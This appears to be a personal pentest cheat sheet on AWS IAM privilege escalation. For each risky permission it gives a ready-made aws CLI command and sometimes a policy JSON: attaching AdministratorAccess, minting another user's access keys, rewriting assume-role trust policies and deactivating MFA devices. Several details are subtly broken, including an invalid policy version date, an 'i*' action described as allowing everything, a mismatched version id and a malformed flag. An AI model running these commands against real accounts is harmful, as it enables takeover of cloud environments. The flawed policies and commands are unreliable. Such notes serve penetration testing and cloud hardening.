---
title: IAM
updated: 2023-01-04 07:30:15Z
created: 2023-01-02 05:49:52Z
latitude: 27.71724530
longitude: 85.32396050
altitude: 0.0000
---

## iam:CreatePolicyVersion

With this privilege, an attacker can create a new version of IAM policy that they have access to, which allows them to set their own custom permissions.

- `aws iam create-policy-version --policy-arn <target_policy_arn> --policy-document file:///path/to/administrator/policy.json --set-as-default`

```
// policy.json
{
  "Version": "2022-10-17",
  "Statement": {
    "Effect": "Allow",
    "Action": "i*",
    "Resource": "*"
  }
}
```

*Where the `policy.json` file would include a policy document that allows **any action against any resource** in the account.*

**Impact:** An attacker can escalate privilege to any AWS resources and entities.

## iam:SetDefaultPolicyVersion

With this privilege, an attacker can be able escalate privileges through existing policy versions that are not currently in use.

- `aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v4`

*Where “v2” is the policy version with the most privileges available.*
**Impact:** An attacker can escalate privilege by setting a different policy version which may have more permissions set.

## iam:CreateAccessKey

With this privilege, an attacker can create an access key ID and secret access key belonging to another user in the AWS environment.

- `aws iam create-access-key --user-name <target_user>`

*Where `target_user` has an extended set of permissions compared to the current user.*
**Impact:** An attacker can direct privilege to another user.

## iam:CreateLoginProfile

With this privilege, an attacker can create a password which is used to login to the AWS console on any user that does not already have a login profile setup.

- `aws iam create-login-profile --user-name <target_user> --no-password-reset-required --password '|[3rxYGGl3@~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'`

*The abovementioned password meets the requirements of password policy of an account.*
**Impact:** Direct privilege escalation to vulnerable users

## iam:AttachUserPolicy

With this privilege, attacker can escalate privilege by attaching the policy to a user that they have access to, which adds the permission of that policy to the attacker.

- `aws iam attach-user-policy --user-name <username> --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"`

**Impact:** Direct privilege escalation to any privileged users.

## iam:AttachGroupPolicy

With this privilege, attacker can escalate privilege by attaching the policy a groupthat they are a part of, which adds the permission of that policy to the attacker.

- `aws iam attach-group-policy --group-name <group_name> --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"`

*Where the group abovementioned is the group where the attacker is part of.*
**Impact:** Direct privilege escalation to any privileged user.

## iam:AttachRolePolicy | sts:AssumeRole

With this privilege, attacker can escalate privilege by attaching a policy to a role that they have access to

- `aws iam attach-role-policy --role-name <role_name> --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"`

**Impact:** Direct privilege escalation to any privileged user.

## iam: PutUserPolicy

With this privilege, attacker can escalate privilege by creating or updating an inline policy for a user which they have access to.

- `aws iam put-user-policy --user-name <username> --policy-name <inline_policy> --policy-document "file:///path/to/administrator/policy.json"`

```
// Policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "*"
            ],
            "Resource": [
                "*"
            ]
        }
    ]
}
```

**Impact:** Direct privilege escalation to any privileged user.

## iam:PutGroupPolicy

With this privilege, attacker can escalate privilege by creating or updating an inline policy for a group that they are a part of.

- `aws iam put-group-policy --group-name <group_name> --policy-name <group_inline_policy> -policy-document file:///path/to/administrator/policy.json`

**Impact:** Direct Privilege escalation to privileged user.

## iam:PutRolePolicy | sts: AssumeRole

With this privilege, attacker can escalate privilege by creating or updating an inline policy for a role that they have access to.

- `aws iam put-role-policy --role-name <role_name> --policy-name <role_inline_policy> --policy-document file:///path/to/administrator/policy.json`

*Where the abovementioned role is role that the current user can temporarily assume with `sts:AssumeRole`.*
**Impact:** Direct privilege escalation to privileged user.

## iam:AddUserToGroup

With this privilege, an attacker can add themselves to an existing prvileged IAM group in the AWS account.

- `aws iam add-user-to-group --group-name <target_group> --user-name <username>`

**Impact:** Direct privilege escalation to any privileged group.

## iam:UpdateAssumeRolePolicy | sts:AssumeRole

With these two privilege, attacker can change the assume role policy document of any existing role to allow them to assume that role.

- `aws iam update-assume-role-policy --role-name <role_to_assume> --policy-document file:///path/to/assume/role/policy.json`

Assume Role Policy looks something like this:

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "sts:AssumeRole",
            "Principal": {
                "AWS": "$USER_ARN"
            }
        }
    ]
}
```

**Impact:** Direct Privllege escalation to any privileged role.

## iam:DeactivateMFADevice

With this privilege, attacker can deactivate the specified MFA device and remove its association with IAM user for which it was originally enabled.

- `aws iam deactivate-mfa-device --user-name <username> --serial-number <value>`

**Impact:** Indirect privilege escalation to a privilged user by disabling the MFA device.